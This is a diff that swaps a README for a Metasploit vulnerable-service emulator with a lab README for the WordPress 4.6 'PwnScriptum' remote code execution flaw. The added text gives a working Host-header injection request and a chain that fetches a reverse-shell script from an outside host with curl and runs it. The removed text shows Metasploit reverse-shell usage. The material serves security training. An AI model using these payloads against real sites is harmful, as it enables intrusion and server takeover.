@@ -1,123 +1,63 @@
-# Metasploit Vulnerable Services Emulator
+# Wordpress 4.6 Remote Code Execution Vulnerability（PwnScriptum）
 
-   Many IT professionals and engineers want to learn security because it's such a hot field right now.  There are many free tools 
-out there, one of the most famous is Metasploit.  An obvious route to teach oneself about security is to download Metasploit and
-play with it. However, without vulnerable services to test again, it's hard to play with Metasploit. 
+[中文版本(Chinese version)](README.zh-cn.md)
 
-   The tool is created to emulate vulnerable services for the purpose of 
-* test Metasploit modules.  
-* help with training on Metasploit. 
+## Reference link
 
-   It runs on Linux (Ubuntu), windows platform (hopefully Mac OSX). Currently it supports over 100 emulated vulnerable services,
-we will keep adding more to cover as many of the 1000+ modules in Metasploit as possible. 
+https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
 
-# Key feature
-
-  To make it easy to add a new emulated service, we have designed it to be language independent: the service emulation is 
-in JSON format, one can add/remove/edit a service in JSON very quickly
-
-  A minor but interesting feature is that we make it easy to create SSL socket, all TCP sockets can automatically upgrade to SSL. 
-
-# Quick run
-
-Note that the commands typed on the shell session spawned are actually executed on the target, so please run this emulator in a safe environment if you don't want it to be owned :-)
-
-You may have to install the following packages depending on your environment: IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable.
-On my Ubuntu, they can be installed as
-```
-sudo cpanm install IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable JSON
-```
-
-On vulnerability Emulator:
-```
-perl vulEmu.pl
->>activate exploits/windows/iis/ms01_023_printer
+## Environment setup
 
 ```
-on Metasploit console:
-```
-msf > use exploit/windows/iis/ms01_023_printer
-msf > set payload windows/shell_reverse_tcp
-msf > setg RHOST 127.0.0.1
-msf > setg LHOST 127.0.0.1
-msf exploit(ms01_023_printer) > run
-
-[*] Started reverse TCP handler on 127.0.0.1:4444 
-[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:51852) at 2017-01-20 10:47:12 -0600
-
->>ls
-README.md
-secret.txt
-server_cert.pem
-server_key.pem
-service.cfg
-vulEmu.pl
-
+docker-compose build
+docker-compose up -d
 ```
 
-# Run it with Docker
+Because Mysql initialization needs a little time, so please wait. After initialization succeeds, visit the site, set the administrator username and password to use it (the database is configured and not automatically updated).
 
-If you want to run the above example in a container environment with docker, just run:
+## Exploit
 
-```
-docker run --rm -it -p 80:80 vulnerables/metasploit-vulnerability-emulator
-```
-
-Then you will be presented to the very same shell, if you don't have docker installed, just follow the instructions [here](https://docker.com).
-
-Remember, you have to map the port that you want addding a `-p external-port:internal-port` argument. To map all ports present in service.cfg, please run this command:
+Send the following packet, and you can see that `/tmp/success` has been successfully created:
 
 ```
-docker run --rm -it \
-       -p 20:20 -p 21:21 -p 80:80 -p 443:443 -p 4848:4848 \
-       -p 6000:6000 -p 6060:6060 -p 7000:7000 -p 7181:7181 \
-       -p 7547:7547 -p 8000:8000 -p 8008:8008 -p 8020:8020 \
-       -p 8080:8080 -p 8400:8400 \
-       vulnerables/metasploit-vulnerability-emulator
+POST /wp-login.php?action=lostpassword HTTP/1.1
+Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
+Connection: close
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Accept: */*
+Content-Length: 56
+Content-Type: application/x-www-form-urlencoded
+
+wp-submit=Get+New+Password&redirect_to=&user_login=admin
 ```
 
-# Developer overview
+We need to meet the following requirements to exploit this vulnerability:
 
+1. The executed command cannot contain some special characters, such as `:`, `'`,`"`, etc.
+2. The command will be converted to lowercase letters
+3. The command needs to use an absolute path
+4. Need know an existing user username
 
-The software has two parts
+In order to solve these problems, the vulnerability author came up with $`substr{0}{1}{$spool_directory}}` instead of `/`, using `${substr{10}{1}{$tod_log} }` method of replacing spaces.
 
-* Server/service emulation description file in JSON  (service.cfg)
-* Interpreter (currently implemented in perl, but it can be done with other languages too)
+However, there are still a lot of characters can't be used. So we need to put the command on the third-party website, and then download it to `/tmp` directory by `curl -o /tmp/rce example.com/shell.sh`.
 
-Here is a quick example from part of the service emulation description file, for the Metasploit module exploit/multi/http/tomcat_mgr_deploy.
+Therefore, the expliot process is follows:
 
+1. Write the exp of reverse shell and put it on a site. The exp have this following requirements:
+ - the entire url's uppercase letters will be converted to lowercase, so the file path should not contain uppercase letters.
+ - Access to this page can't be redirected because the parameter for follow redirect is `-L` (uppercase).
 
-```
-	"exploit/multi/http/tomcat_mgr_deploy" : {
-		"defaultPort": [80],
-		"seq": [
-			["substr", "GET \/manager\/serverinfo"],
-			["HTTP/1.0 200 OK\r\nContent-Length: $\r\n\r\n", "!!OS Name: Linux\nOS Architecture: x86_64"],
-			["starts", "PUT /manager/deploy?path="],
-			["HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n", {
-				"connect": "127.0.0.1:4444"
-			}]
-		]
-	},
-```
+2. Splice the command`/usr/bin/curl -o/tmp/rce example.com/shell.sh`and`/bin/bash /tmp/rce`.
 
- The most important part is the "seq" array. it always has even number of entries.  When a message is received, it's compared
-to the entries 0, 2, 4 ... Once a match is found, it will execute the entry immediately after it.  For example, if an entry
-matches with entry 2, it will execute the statements in entry 3. 
+3. Convert the spaces and `/` in the command to `${substr{10}{1}{$tod_log}}` and `${substr{0}{1}{$spool_directory}}`.
 
- The matching entries have the matching actions such as
+4. Produce the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
 
-* **substr**:  do a substring match
-* **regex**:   do a regular expression match
-* **starts**:  check if incoming message starts with the string in the entry
+5. Send these two packets in order.
 
-  The execution entry itself can have multiple entries. Each entry can be just a string, an array or dictionary. strings and arrays
-are used to build the response message (by concatentation).  For an array, it has a few elements, the first element is action type,
-such as
+Here is [expliot.py](exploit.py)，change `target` to your target site，change `user` to an exist user name，change `shell_url` to your payload site.
 
-* **repeat**:  return a string after repeating the string (second element) by the certain number of times specified by the third element.
-* **nsize**:   return the size of the element
-* **gzip**:    return the gzipped content
-   
-   It can also do compacting of string into binary data, such as  ["N", 123] which will compact the number 123 into big-endean 
-4-byte integer.
+Execute to get the shell:
+
+![](1.png)
